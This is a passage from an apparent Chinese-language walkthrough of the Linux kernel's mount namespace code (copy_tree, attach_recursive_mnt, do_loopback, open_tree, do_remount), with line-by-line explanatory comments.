mnt_ns-&gt;seq;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879struct mount *copy_tree(struct mount *mnt, struct dentry *dentry, int flag)&#123; // 复制挂载树 struct mount *res, *p, *q, *r, *parent; // 如果标志位中不包含CL_COPY_UNBINDABLE，并且mnt是不可解绑的，则返回错误码EINVAL if (!(flag &amp; CL_COPY_UNBINDABLE) &amp;&amp; IS_MNT_UNBINDABLE(mnt)) return ERR_PTR(-EINVAL); // 如果标志位中不包含CL_COPY_MNT_NS_FILE，并且dentry是挂载命名空间文件，则返回错误码EINVAL if (!(flag &amp; CL_COPY_MNT_NS_FILE) &amp;&amp; is_mnt_ns_file(dentry)) return ERR_PTR(-EINVAL); // 克隆挂载点 res = q = clone_mnt(mnt, dentry, flag); if (IS_ERR(q)) return q; // 设置克隆的挂载点的挂载点 q-&gt;mnt_mountpoint = mnt-&gt;mnt_mountpoint; // 遍历挂载点的子挂载点 p = mnt; list_for_each_entry(r, &amp;mnt-&gt;mnt_mounts, mnt_child) &#123; struct mount *s; // 如果r的挂载点不是dentry的子目录，则继续下一个挂载点 if (!is_subdir(r-&gt;mnt_mountpoint, dentry)) continue; // 遍历r及其子挂载点 for (s = r; s; s = next_mnt(s, r)) &#123; // 如果标志位中不包含CL_COPY_UNBINDABLE，并且s是不可解绑的 if (!(flag &amp; CL_COPY_UNBINDABLE) &amp;&amp; IS_MNT_UNBINDABLE(s)) &#123; // 如果s被锁定，则返回错误码EPERM；否则跳过该挂载点及其子挂载点 if (s-&gt;mnt.mnt_flags &amp; MNT_LOCKED) &#123; /* 同时不可解绑和被锁定。 */ q = ERR_PTR(-EPERM); goto out; &#125; else &#123; s = skip_mnt_tree(s); continue; &#125; &#125; // 如果标志位中不包含CL_COPY_MNT_NS_FILE，并且s是挂载命名空间文件，则跳过该挂载点及其子挂载点 if (!(flag &amp; CL_COPY_MNT_NS_FILE) &amp;&amp; is_mnt_ns_file(s-&gt;mnt.mnt_root)) &#123; s = skip_mnt_tree(s); continue; &#125; // 将p和q移动到s的父挂载点 while (p != s-&gt;mnt_parent) &#123; p = p-&gt;mnt_parent; q = q-&gt;mnt_parent; &#125; p = s; parent = q; // 克隆挂载点 q = clone_mnt(p, p-&gt;mnt.mnt_root, flag); if (IS_ERR(q)) goto out; // 锁定挂载哈希表，将克隆的挂载点添加到结果挂载点的链表中，并建立挂载关系 lock_mount_hash(); list_add_tail(&amp;q-&gt;mnt_list, &amp;res-&gt;mnt_list); attach_mnt(q, parent, p-&gt;mnt_mp); unlock_mount_hash(); &#125; &#125; return res;out: // 如果出错，则释放已分配的资源 if (res) &#123; lock_mount_hash(); umount_tree(res, UMOUNT_SYNC); unlock_mount_hash(); &#125; return q;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162/** * collect_mounts - 收集挂载点 * @path: 要收集的路径 * * 调用者应该检查返回的指针是否有错误。 */struct vfsmount *collect_mounts(const struct path *path)&#123; struct mount *tree; namespace_lock(); // 获取命名空间锁 if (!check_mnt(real_mount(path-&gt;mnt))) // 检查挂载点是否有效 tree = ERR_PTR(-EINVAL); else tree = copy_tree(real_mount(path-&gt;mnt), path-&gt;dentry, CL_COPY_ALL | CL_PRIVATE); // 复制挂载点树 namespace_unlock(); // 释放命名空间锁 if (IS_ERR(tree)) // 检查是否出错 return ERR_CAST(tree); return &amp;tree-&gt;mnt; // 返回挂载点树&#125;static void free_mnt_ns(struct mnt_namespace *);static struct mnt_namespace *alloc_mnt_ns(struct user_namespace *, bool);void dissolve_on_fput(struct vfsmount *mnt)&#123; struct mnt_namespace *ns; namespace_lock(); // 获取命名空间锁 lock_mount_hash(); // 锁定挂载点哈希表 ns = real_mount(mnt)-&gt;mnt_ns; if (ns) &#123; if (is_anon_ns(ns)) umount_tree(real_mount(mnt), UMOUNT_CONNECTED); // 解除连接的挂载点树 else ns = NULL; &#125; unlock_mount_hash(); // 解锁挂载点哈希表 namespace_unlock(); // 释放命名空间锁 if (ns) free_mnt_ns(ns); // 释放挂载命名空间&#125;void drop_collected_mounts(struct vfsmount *mnt)&#123; namespace_lock(); // 获取命名空间锁 lock_mount_hash(); // 锁定挂载点哈希表 umount_tree(real_mount(mnt), 0); // 卸载挂载点树 unlock_mount_hash(); // 解锁挂载点哈希表 namespace_unlock(); // 释放命名空间锁&#125;static bool has_locked_children(struct mount *mnt, struct dentry *dentry)&#123; struct mount *child; list_for_each_entry(child, &amp;mnt-&gt;mnt_mounts, mnt_child) &#123; if (!is_subdir(child-&gt;mnt_mountpoint, dentry)) // 检查是否为子目录 continue; if (child-&gt;mnt.mnt_flags &amp; MNT_LOCKED) // 检查是否有被锁定的子挂载点 return true; &#125; return false;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758static void lock_mnt_tree(struct mount *mnt)&#123; struct mount *p; // 遍历挂载点树 for (p = mnt; p; p = next_mnt(p, mnt)) &#123; int flags = p-&gt;mnt.mnt_flags; /* 不允许非特权用户更改挂载标志 */ flags |= MNT_LOCK_ATIME; // 将挂载标志中的MNT_LOCK_ATIME设置为1 if (flags &amp; MNT_READONLY) // 如果挂载标志中包含MNT_READONLY flags |= MNT_LOCK_READONLY; // 将挂载标志中的MNT_LOCK_READONLY设置为1 if (flags &amp; MNT_NODEV) // 如果挂载标志中包含MNT_NODEV flags |= MNT_LOCK_NODEV; // 将挂载标志中的MNT_LOCK_NODEV设置为1 if (flags &amp; MNT_NOSUID) // 如果挂载标志中包含MNT_NOSUID flags |= MNT_LOCK_NOSUID; // 将挂载标志中的MNT_LOCK_NOSUID设置为1 if (flags &amp; MNT_NOEXEC) // 如果挂载标志中包含MNT_NOEXEC flags |= MNT_LOCK_NOEXEC; // 将挂载标志中的MNT_LOCK_NOEXEC设置为1 /* 不允许非特权用户查看挂载点下的内容 */ if (list_empty(&amp;p-&gt;mnt_expire)) flags |= MNT_LOCKED; // 将挂载标志中的MNT_LOCKED设置为1 p-&gt;mnt.mnt_flags = flags; // 更新挂载点的挂载标志 &#125;&#125;static void cleanup_group_ids(struct mount *mnt, struct mount *end)&#123; struct mount *p; // 清理挂载点的组ID for (p = mnt; p != end; p = next_mnt(p, mnt)) &#123; if (p-&gt;mnt_group_id &amp;&amp; !IS_MNT_SHARED(p)) mnt_release_group_id(p); // 释放挂载点的组ID &#125;&#125;static int invent_group_ids(struct mount *mnt, bool recurse)&#123; struct mount *p; // 为挂载点分配组ID for (p = mnt; p; p = recurse ? next_mnt(p, mnt) : NULL) &#123; if (!p-&gt;mnt_group_id &amp;&amp; !IS_MNT_SHARED(p)) &#123; int err = mnt_alloc_group_id(p); // 分配挂载点的组ID if (err) &#123; cleanup_group_ids(mnt, p); // 分配失败时清理之前分配的组ID return err; &#125; &#125; &#125; return 0;&#125; 12345678910111213141516171819202122int count_mounts(struct mnt_namespace *ns, struct mount *mnt)&#123; unsigned int max = READ_ONCE(sysctl_mount_max); // 读取sysctl_mount_max的值并赋给max unsigned int mounts = 0; // 初始化mounts为0，用于计数 struct mount *p; if (ns-&gt;mounts &gt;= max) // 如果ns的mounts计数超过了max return -ENOSPC; // 返回&quot;没有空间&quot;的错误码 max -= ns-&gt;mounts; // 更新max的值，减去已有的mounts计数 if (ns-&gt;pending_mounts &gt;= max) // 如果ns的pending_mounts计数超过了max return -ENOSPC; // 返回&quot;没有空间&quot;的错误码 max -= ns-&gt;pending_mounts; // 更新max的值，减去已有的pending_mounts计数 for (p = mnt; p; p = next_mnt(p, mnt)) // 遍历挂载点链表 mounts++; // 每遍历一个挂载点，mounts计数加1 if (mounts &gt; max) // 如果mounts计数超过了max return -ENOSPC; // 返回&quot;没有空间&quot;的错误码 ns-&gt;pending_mounts += mounts; // 更新ns的pending_mounts计数，加上新的mounts计数 return 0; // 返回成功的状态码&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/* * @source_mnt : 要附加的挂载树 * @nd : 将挂载树 @source_mnt 附加到的位置 * @parent_nd : 如果非空，将 source_mnt 从其父节点分离，并存储父节点挂载和挂载点 dentry。 * （当移动 source_mnt 时执行此操作） * * 注意：下表解释了给定类型的源挂载附加到给定类型的目标挂载时的语义。 * --------------------------------------------------------------------------- * | 绑定挂载操作 | * |************************************************************************** * | source--&gt;| 共享 | 私有 | 从属 | 不可解绑 | * | dest | | | | | * | | | | | | | * | v | | | | | * |************************************************************************** * | 共享 | 共享 (++) | 共享 (+) | 共享(+++) | 无效 | * | | | | | | * |非共享 | 共享 (+) | 私有 | 从属 (*) | 无效 | * *************************************************************************** * 绑定操作克隆源挂载并将克隆挂载到目标挂载上。 * * (++) 克隆的挂载传播到目标挂载的传播树中的所有挂载点，并将克隆的挂载添加到源挂载的对等组中。 * (+) 克隆的挂载在目标挂载下创建，并标记为共享。克隆的挂载添加到源挂载的对等组中。 * (+++) 挂载传播到目标挂载的传播树中的所有挂载点，并将克隆的挂载作为源挂载的从属挂载，与源挂载相同的主挂载。克隆的挂载标记为“共享和从属”。 * (*) 克隆的挂载作为源挂载的从属挂载，与源挂载相同的主挂载。 * * --------------------------------------------------------------------------- * | 移动挂载操作 | * |************************************************************************** * | source--&gt;| 共享 | 私有 | 从属 | 不可解绑 | * | dest | | | | | * | | | | | | | * | v | | | | | * |************************************************************************** * | 共享 | 共享 (+) | 共享 (+) | 共享(+++) | 无效 | * | | | | | | * |非共享 | 共享 (+*) | 私有 | 从属 (*) | 不可解绑 | * *************************************************************************** * * (+) 挂载被移动到目标位置，并传播到目标挂载的传播树中的所有挂载点。 * (+*) 挂载被移动到目标位置。 * (+++) 挂载被移动到目标位置，并传播到目标挂载的传播树中的所有挂载点。挂载被标记为“共享和从属”。 * (*) 挂载在新位置继续作为从属挂载。 * * 如果源挂载是一个树，则上述操作将应用于树中的每个挂载。 * 必须在未持有自旋锁的情况下调用此函数，因为此函数可能会在分配时休眠。 */ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115static int attach_recursive_mnt(struct mount *source_mnt, struct mount *dest_mnt, struct mountpoint *dest_mp, bool moving)&#123; // 获取当前进程的用户命名空间 struct user_namespace *user_ns = current-&gt;nsproxy-&gt;mnt_ns-&gt;user_ns; // 创建一个哈希链表用于存储树状结构的挂载点 HLIST_HEAD(tree_list); // 获取目标挂载点的命名空间 struct mnt_namespace *ns = dest_mnt-&gt;mnt_ns; struct mountpoint *smp; struct mount *child, *p; struct hlist_node *n; int err; /* Preallocate a mountpoint in case the new mounts need * to be tucked under other mounts. */ // 预分配一个挂载点，以便将新的挂载点放置在其他挂载点下面 smp = get_mountpoint(source_mnt-&gt;mnt.mnt_root); if (IS_ERR(smp)) return PTR_ERR(smp); /* Is there space to add these mounts to the mount namespace? */ // 检查是否有足够的空间将这些挂载点添加到挂载命名空间中 if (!moving) &#123; err = count_mounts(ns, source_mnt); if (err) goto out; &#125; if (IS_MNT_SHARED(dest_mnt)) &#123; // 为源挂载点创建组ID err = invent_group_ids(source_mnt, true); if (err) goto out; // 将源挂载点传播到目标挂载点下的树状结构中 err = propagate_mnt(dest_mnt, dest_mp, source_mnt, &amp;tree_list); lock_mount_hash(); if (err) goto out_cleanup_ids; // 将源挂载点及其子挂载点设置为共享挂载点 for (p = source_mnt; p; p = next_mnt(p, source_mnt)) set_mnt_shared(p); &#125; else &#123; lock_mount_hash(); &#125; if (moving) &#123; // 从哈希表中移除源挂载点 unhash_mnt(source_mnt); // 将源挂载点附加到目标挂载点下的挂载点 attach_mnt(source_mnt, dest_mnt, dest_mp); // 更新源挂载点所属的挂载命名空间 touch_mnt_namespace(source_mnt-&gt;mnt_ns); &#125; else &#123; if (source_mnt-&gt;mnt_ns) &#123; /* move from anon - the caller will destroy */ // 从匿名命名空间中移动挂载点，调用者将销毁该挂载点 list_del_init(&amp;source_mnt-&gt;mnt_ns-&gt;list); &#125; // 设置源挂载点的挂载点信息 mnt_set_mountpoint(dest_mnt, dest_mp, source_mnt); // 提交源挂载点的树状结构 commit_tree(source_mnt); &#125; // 遍历树状结构中的每个子挂载点 hlist_for_each_entry_safe(child, n, &amp;tree_list, mnt_hash) &#123; struct mount *q; // 从树状结构中移除子挂载点 hlist_del_init(&amp;child-&gt;mnt_hash); // 查找子挂载点的父挂载点 q = __lookup_mnt(&amp;child-&gt;mnt_parent-&gt;mnt, child-&gt;mnt_mountpoint); if (q) // 更改子挂载点的挂载点信息 mnt_change_mountpoint(child, smp, q); /* Notice when we are propagating across user namespaces */ // 当在用户命名空间之间传播时，需要锁定挂载树 if (child-&gt;mnt_parent-&gt;mnt_ns-&gt;user_ns != user_ns) lock_mnt_tree(child); // 清除子挂载点的锁定标志 child-&gt;mnt.mnt_flags &amp;= ~MNT_LOCKED; // 提交子挂载点的树状结构 commit_tree(child); &#125; // 释放挂载点 put_mountpoint(smp); // 解锁挂载哈希表 unlock_mount_hash(); return 0;out_cleanup_ids: // 清理组ID while (!hlist_empty(&amp;tree_list)) &#123; child = hlist_entry(tree_list.first, struct mount, mnt_hash); child-&gt;mnt_parent-&gt;mnt_ns-&gt;pending_mounts = 0; // 卸载子挂载点的树状结构 umount_tree(child, UMOUNT_SYNC); &#125; unlock_mount_hash(); // 清理组ID cleanup_group_ids(source_mnt, NULL);out: ns-&gt;pending_mounts = 0; read_seqlock_excl(&amp;mount_lock); // 释放挂载点 put_mountpoint(smp); read_sequnlock_excl(&amp;mount_lock); return err;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970static struct mountpoint *lock_mount(struct path *path)&#123; struct vfsmount *mnt; struct dentry *dentry = path-&gt;dentry;retry: // 锁定inode inode_lock(dentry-&gt;d_inode); if (unlikely(cant_mount(dentry))) &#123; // 如果无法挂载，则解锁inode并返回错误指针 inode_unlock(dentry-&gt;d_inode); return ERR_PTR(-ENOENT); &#125; // 锁定命名空间 namespace_lock(); // 查找挂载点 mnt = lookup_mnt(path); if (likely(!mnt)) &#123; // 如果找不到挂载点，则获取挂载点 struct mountpoint *mp = get_mountpoint(dentry); if (IS_ERR(mp)) &#123; // 如果获取挂载点失败，则解锁命名空间和inode，并返回错误指针 namespace_unlock(); inode_unlock(dentry-&gt;d_inode); return mp; &#125; // 返回挂载点 return mp; &#125; // 解锁命名空间和inode namespace_unlock(); inode_unlock(path-&gt;dentry-&gt;d_inode); // 释放路径，并将mnt赋值给路径的mnt成员，将mnt的mnt_root赋值给路径的dentry成员 path_put(path); path-&gt;mnt = mnt; dentry = path-&gt;dentry = dget(mnt-&gt;mnt_root); // 重新尝试 goto retry;&#125;static void unlock_mount(struct mountpoint *where)&#123; struct dentry *dentry = where-&gt;m_dentry; // 获取读写序列锁 read_seqlock_excl(&amp;mount_lock); // 释放挂载点 put_mountpoint(where); // 解锁读写序列锁 read_sequnlock_excl(&amp;mount_lock); // 解锁命名空间和inode namespace_unlock(); inode_unlock(dentry-&gt;d_inode);&#125;static int graft_tree(struct mount *mnt, struct mount *p, struct mountpoint *mp)&#123; // 检查是否禁止用户挂载 if (mnt-&gt;mnt.mnt_sb-&gt;s_flags &amp; SB_NOUSER) return -EINVAL; // 检查挂载点和挂载源是否都为目录 if (d_is_dir(mp-&gt;m_dentry) != d_is_dir(mnt-&gt;mnt.mnt_root)) return -ENOTDIR; // 递归挂载子树 return attach_recursive_mnt(mnt, p, mp, false);&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687/* * 检查更改挂载点传播标志的标志位是否合法。 */static int flags_to_propagation_type(int ms_flags)&#123; int type = ms_flags &amp; ~(MS_REC | MS_SILENT); /* 如果设置了非传播标志，则失败 */ if (type &amp; ~(MS_SHARED | MS_PRIVATE | MS_SLAVE | MS_UNBINDABLE)) return 0; /* 只能设置一个传播标志 */ if (!is_power_of_2(type)) return 0; return type;&#125;/* * 递归地更改挂载点的类型。 */static int do_change_type(struct path *path, int ms_flags)&#123; struct mount *m; struct mount *mnt = real_mount(path-&gt;mnt); int recurse = ms_flags &amp; MS_REC; int type; int err = 0; if (path-&gt;dentry != path-&gt;mnt-&gt;mnt_root) return -EINVAL; type = flags_to_propagation_type(ms_flags); if (!type) return -EINVAL; // 锁定命名空间 namespace_lock(); if (type == MS_SHARED) &#123; // 为挂载点创建组ID err = invent_group_ids(mnt, recurse); if (err) goto out_unlock; &#125; // 锁定挂载点哈希表 lock_mount_hash(); for (m = mnt; m; m = (recurse ? next_mnt(m, mnt) : NULL)) // 更改挂载点的传播类型 change_mnt_propagation(m, type); // 解锁挂载点哈希表 unlock_mount_hash();out_unlock: // 解锁命名空间 namespace_unlock(); return err;&#125;static struct mount *__do_loopback(struct path *old_path, int recurse)&#123; struct mount *mnt = ERR_PTR(-EINVAL), *old = real_mount(old_path-&gt;mnt); // 如果挂载点不可解绑，则返回错误指针 if (IS_MNT_UNBINDABLE(old)) return mnt; // 如果挂载点无效且dentry操作不是ns_dentry_operations，则返回错误指针 if (!check_mnt(old) &amp;&amp; old_path-&gt;dentry-&gt;d_op != &amp;ns_dentry_operations) return mnt; // 如果不递归且挂载点有锁定的子节点，则返回错误指针 if (!recurse &amp;&amp; has_locked_children(old, old_path-&gt;dentry)) return mnt; if (recurse) // 复制树结构 mnt = copy_tree(old, old_path-&gt;dentry, CL_COPY_MNT_NS_FILE); else // 克隆挂载点 mnt = clone_mnt(old, old_path-&gt;dentry, 0); if (!IS_ERR(mnt)) // 清除MNT_LOCKED标志 mnt-&gt;mnt.mnt_flags &amp;= ~MNT_LOCKED; return mnt;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/* * 执行回环挂载。 */static int do_loopback(struct path *path, const char *old_name, int recurse)&#123; struct path old_path; struct mount *mnt = NULL, *parent; struct mountpoint *mp; int err; if (!old_name || !*old_name) return -EINVAL; // 获取旧路径 err = kern_path(old_name, LOOKUP_FOLLOW|LOOKUP_AUTOMOUNT, &amp;old_path); if (err) return err; err = -EINVAL; // 如果旧路径的dentry属于mnt命名空间，则跳转到out if (mnt_ns_loop(old_path.dentry)) goto out; // 锁定挂载点 mp = lock_mount(path); if (IS_ERR(mp)) &#123; err = PTR_ERR(mp); goto out; &#125; // 获取挂载点的真实挂载 parent = real_mount(path-&gt;mnt); // 如果挂载点无效，则跳转到out2 if (!check_mnt(parent)) goto out2; // 执行回环挂载 mnt = __do_loopback(&amp;old_path, recurse); if (IS_ERR(mnt)) &#123; err = PTR_ERR(mnt); goto out2; &#125; // 将回环挂载的子树接入到父挂载点下 err = graft_tree(mnt, parent, mp); if (err) &#123; // 锁定挂载点哈希表 lock_mount_hash(); // 卸载回环挂载的子树 umount_tree(mnt, UMOUNT_SYNC); // 解锁挂载点哈希表 unlock_mount_hash(); &#125;out2: // 解锁挂载点 unlock_mount(mp);out: // 释放旧路径 path_put(&amp;old_path); return err;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051static struct file *open_detached_copy(struct path *path, bool recursive)&#123; struct user_namespace *user_ns = current-&gt;nsproxy-&gt;mnt_ns-&gt;user_ns; struct mnt_namespace *ns = alloc_mnt_ns(user_ns, true); struct mount *mnt, *p; struct file *file; if (IS_ERR(ns)) return ERR_CAST(ns); // 锁定命名空间 namespace_lock(); // 执行回环挂载 mnt = __do_loopback(path, recursive); if (IS_ERR(mnt)) &#123; namespace_unlock(); free_mnt_ns(ns); return ERR_CAST(mnt); &#125; // 锁定挂载点哈希表 lock_mount_hash(); for (p = mnt; p; p = next_mnt(p, mnt)) &#123; // 设置挂载点的命名空间 p-&gt;mnt_ns = ns; ns-&gt;mounts++; &#125; // 设置命名空间的根挂载点 ns-&gt;root = mnt; // 将命名空间添加到挂载点的链表中 list_add_tail(&amp;ns-&gt;list, &amp;mnt-&gt;mnt_list); mntget(&amp;mnt-&gt;mnt); // 解锁挂载点哈希表 unlock_mount_hash(); // 解锁命名空间 namespace_unlock(); // 释放原路径的挂载点 mntput(path-&gt;mnt); // 将新的挂载点赋值给路径的mnt成员 path-&gt;mnt = &amp;mnt-&gt;mnt; // 打开路径对应的文件 file = dentry_open(path, O_PATH, current_cred()); if (IS_ERR(file)) // 如果打开文件失败，则解散挂载点 dissolve_on_fput(path-&gt;mnt); else // 如果成功打开文件，则设置文件的f_mode标志 file-&gt;f_mode |= FMODE_NEED_UNMOUNT; return file;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152SYSCALL_DEFINE3(open_tree, int, dfd, const char __user *, filename, unsigned, flags)&#123; struct file *file; // 文件指针 struct path path; // 路径结构体 int lookup_flags = LOOKUP_AUTOMOUNT | LOOKUP_FOLLOW; // 查找标志 bool detached = flags &amp; OPEN_TREE_CLONE; // 是否分离 int error; // 错误码 int fd; // 文件描述符 BUILD_BUG_ON(OPEN_TREE_CLOEXEC != O_CLOEXEC); // 编译时检查 if (flags &amp; ~(AT_EMPTY_PATH | AT_NO_AUTOMOUNT | AT_RECURSIVE | AT_SYMLINK_NOFOLLOW | OPEN_TREE_CLONE | OPEN_TREE_CLOEXEC)) return -EINVAL; // 参数错误 if ((flags &amp; (AT_RECURSIVE | OPEN_TREE_CLONE)) == AT_RECURSIVE) return -EINVAL; // 参数错误 if (flags &amp; AT_NO_AUTOMOUNT) lookup_flags &amp;= ~LOOKUP_AUTOMOUNT; // 不自动挂载 if (flags &amp; AT_SYMLINK_NOFOLLOW) lookup_flags &amp;= ~LOOKUP_FOLLOW; // 不跟随符号链接 if (flags &amp; AT_EMPTY_PATH) lookup_flags |= LOOKUP_EMPTY; // 空路径 if (detached &amp;&amp; !may_mount()) return -EPERM; // 没有权限 fd = get_unused_fd_flags(flags &amp; O_CLOEXEC); // 获取未使用的文件描述符 if (fd &lt; 0) return fd; // 获取失败 error = user_path_at(dfd, filename, lookup_flags, &amp;path); // 获取用户路径 if (unlikely(error)) &#123; file = ERR_PTR(error); // 错误处理 &#125; else &#123; if (detached) file = open_detached_copy(&amp;path, flags &amp; AT_RECURSIVE); // 分离复制 else file = dentry_open(&amp;path, O_PATH, current_cred()); // 打开目录项 path_put(&amp;path); // 释放路径 &#125; if (IS_ERR(file)) &#123; put_unused_fd(fd); // 释放文件描述符 return PTR_ERR(file); // 返回错误码 &#125; fd_install(fd, file); // 安装文件描述符 return fd; // 返回文件描述符&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647/* * 不允许清除已锁定的挂载标志。 * * 在测试各种MNT_LOCK标志时，此处不需要持有任何锁定，因为一旦设置了这些标志，它们就不能被清除。 */static bool can_change_locked_flags(struct mount *mnt, unsigned int mnt_flags)&#123; unsigned int fl = mnt-&gt;mnt.mnt_flags; // 获取挂载标志 if ((fl &amp; MNT_LOCK_READONLY) &amp;&amp; !(mnt_flags &amp; MNT_READONLY)) return false; // 如果已锁定只读标志且请求不是只读，则返回false if ((fl &amp; MNT_LOCK_NODEV) &amp;&amp; !(mnt_flags &amp; MNT_NODEV)) return false; // 如果已锁定无设备标志且请求不是无设备，则返回false if ((fl &amp; MNT_LOCK_NOSUID) &amp;&amp; !(mnt_flags &amp; MNT_NOSUID)) return false; // 如果已锁定无SUID标志且请求不是无SUID，则返回false if ((fl &amp; MNT_LOCK_NOEXEC) &amp;&amp; !(mnt_flags &amp; MNT_NOEXEC)) return false; // 如果已锁定无执行标志且请求不是无执行，则返回false if ((fl &amp; MNT_LOCK_ATIME) &amp;&amp; ((fl &amp; MNT_ATIME_MASK) != (mnt_flags &amp; MNT_ATIME_MASK))) return false; // 如果已锁定访问时间标志且请求的访问时间标志与已有标志不匹配，则返回false return true; // 其他情况返回true&#125;static int change_mount_ro_state(struct mount *mnt, unsigned int mnt_flags)&#123; bool readonly_request = (mnt_flags &amp; MNT_READONLY); // 是否请求只读 if (readonly_request == __mnt_is_readonly(&amp;mnt-&gt;mnt)) return 0; // 如果请求只读状态与当前状态相同，则返回0 if (readonly_request) return mnt_make_readonly(mnt); // 设置为只读 mnt-&gt;mnt.mnt_flags &amp;= ~MNT_READONLY; // 清除只读标志 return 0;&#125;static void set_mount_attributes(struct mount *mnt, unsigned int mnt_flags)&#123; mnt_flags |= mnt-&gt;mnt.mnt_flags &amp; ~MNT_USER_SETTABLE_MASK; // 设置挂载标志 mnt-&gt;mnt.mnt_flags = mnt_flags; // 更新挂载标志 touch_mnt_namespace(mnt-&gt;mnt_ns); // 更新挂载命名空间&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657static void mnt_warn_timestamp_expiry(struct path *mountpoint, struct vfsmount *mnt)&#123; struct super_block *sb = mnt-&gt;mnt_sb; // 获取超级块 if (!__mnt_is_readonly(mnt) &amp;&amp; // 如果挂载点不是只读 (!(sb-&gt;s_iflags &amp; SB_I_TS_EXPIRY_WARNED)) &amp;&amp; // 如果超级块的时间戳过期警告标志未设置 (ktime_get_real_seconds() + TIME_UPTIME_SEC_MAX &gt; sb-&gt;s_time_max)) &#123; // 如果当前时间加上最大运行时间小于超级块的最大时间戳 char *buf = (char *)__get_free_page(GFP_KERNEL); // 分配内存页 char *mntpath = buf ? d_path(mountpoint, buf, PAGE_SIZE) : ERR_PTR(-ENOMEM); // 获取挂载路径 struct tm tm; time64_to_tm(sb-&gt;s_time_max, 0, &amp;tm); // 将时间戳转换为tm结构体 pr_warn(&quot;%s filesystem being %s at %s supports timestamps until %04ld (0x%llx)\\n&quot;, sb-&gt;s_type-&gt;name, is_mounted(mnt) ? &quot;remounted&quot; : &quot;mounted&quot;, mntpath, tm.tm_year+1900, (unsigned long long)sb-&gt;s_time_max); // 打印警告信息 free_page((unsigned long)buf); // 释放内存页 sb-&gt;s_iflags |= SB_I_TS_EXPIRY_WARNED; // 设置超级块的时间戳过期警告标志 &#125;&#125;/* * 仅处理挂载点的重新配置，而不修改它所引用的超级块。这是通过在mount(2)中指定MS_REMOUNT|MS_BIND来触发的。 */static int do_reconfigure_mnt(struct path *path, unsigned int mnt_flags)&#123; struct super_block *sb = path-&gt;mnt-&gt;mnt_sb; // 获取超级块 struct mount *mnt = real_mount(path-&gt;mnt); // 获取挂载结构体 int ret; if (!check_mnt(mnt)) return -EINVAL; // 检查挂载结构体是否有效 if (path-&gt;dentry != mnt-&gt;mnt.mnt_root) return -EINVAL; // 检查挂载点是否为根目录 if (!can_change_locked_flags(mnt, mnt_flags)) return -EPERM; // 检查是否可以更改已锁定的挂载标志 /* * 我们只检查超级块是否为只读，而不修改它，因此只使用down_read(&amp;sb-&gt;s_umount)。 */ down_read(&amp;sb-&gt;s_umount); // 读取锁定超级块 lock_mount_hash(); // 锁定挂载哈希表 ret = change_mount_ro_state(mnt, mnt_flags); // 更改挂载的只读状态 if (ret == 0) set_mount_attributes(mnt, mnt_flags); // 设置挂载属性 unlock_mount_hash(); // 解锁挂载哈希表 up_read(&amp;sb-&gt;s_umount); // 解锁超级块 mnt_warn_timestamp_expiry(path, &amp;mnt-&gt;mnt); // 检查时间戳过期警告 return ret; // 返回结果&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/* * 更改文件系统标志。dir应该是文件系统的物理根目录。 * 如果你在某个地方挂载了一个非根目录，并且想对其进行重新挂载 - 很遗憾。 */static int do_remount(struct path *path, int ms_flags, int sb_flags, int mnt_flags, void *data)&#123; int err; struct super_block *sb = path-&gt;mnt-&gt;mnt_sb; // 获取超级块 struct mount *mnt = real_mount(path-&gt;mnt); // 获取挂载点 struct fs_context *fc; if (!check_mnt(mnt)) // 检查挂载点是否有效 return -EINVAL; if (path-&gt;dentry != path-&gt;mnt-&gt;mnt_root) // 检查路径是否为根目录 return -EINVAL; if (!can_change_locked_flags(mnt, mnt_flags)) // 检查是否可以更改锁定的标志 return -EPERM; fc = fs_context_for_reconfigure(path-&gt;dentry, sb_flags, MS_RMT_MASK); // 为重新配置获取文件系统上下文 if (IS_ERR(fc)) return PTR_ERR(fc); fc-&gt;oldapi = true; err = parse_monolithic_mount_data(fc, data); // 解析挂载数据 if (!err) &#123; down_write(&amp;sb-&gt;s_umount); // 获取超级块的写锁 err = -EPERM; if (ns_capable(sb-&gt;s_user_ns, CAP_SYS_ADMIN)) &#123; // 检查是否具有管理员权限 err = reconfigure_super(fc); // 重新配置超级块 if (!err) &#123; lock_mount_hash(); // 锁定挂载哈希表 set_mount_attributes(mnt, mnt_flags); // 设置挂载点的属性 unlock_mount_hash(); // 解锁挂载哈希表 &#125; &#125; up_write(&amp;sb-&gt;s_umount); // 释放超级块的写锁 &#125; mnt_warn_timestamp_expiry(path, &amp;mnt-&gt;mnt); // 警告挂载点的时间戳过期 put_fs_context(fc); // 释放文件系统上下文 return err;&#125;static inline int tree_contains_unbindable(struct mount *mnt)&#123; struct mount *p; for (p = mnt; p; p = next_mnt(p, mnt)) &#123; // 遍历挂载点及其子挂载点 if (IS_MNT_UNBINDABLE(p)) // 检查挂载点是否不可解绑 return 1; &#125; return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091/* * 检查指定子树中是否存在对先前/相同挂载命名空间的引用。 * 这样的引用可以作为挂载命名空间的锚点，而不会被挂载循环检查代码检查到，从而允许形成循环。 */static bool check_for_nsfs_mounts(struct mount *subtree)&#123; struct mount *p; bool ret = false; lock_mount_hash(); // 锁定挂载哈希表 for (p = subtree; p; p = next_mnt(p, subtree)) // 遍历子树中的挂载点 if (mnt_ns_loop(p-&gt;mnt.mnt_root)) // 检查是否存在挂载命名空间循环引用 goto out; ret = true;out: unlock_mount_hash(); // 解锁挂载哈希表 return ret;&#125;static int do_set_group(struct path *from_path, struct path *to_path)&#123; struct mount *from, *to; int 